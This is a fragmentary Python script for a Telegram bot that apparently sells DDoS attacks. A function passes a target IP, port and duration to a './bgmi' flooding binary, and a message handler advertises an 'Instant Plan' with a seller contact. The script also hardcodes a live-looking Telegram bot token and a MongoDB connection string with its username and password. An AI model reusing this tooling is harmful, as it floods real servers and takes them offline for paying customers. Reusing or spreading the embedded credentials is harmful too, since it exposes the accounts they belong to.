...
TOKEN = '7363825803:AAHMOmHBQJbx1KaQqsARlplNzy4xX6Rr7ZQ'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002118842525
CHANNEL_ID = -1002118842525
error_channel_id = -1002118842525
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./bgmi {target_ip} {target_port} {duration} 80"
    try:
...
def handle_message(message):
    ...
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: @SWARG_DEVELOPER*", parse_mode='Markdown')
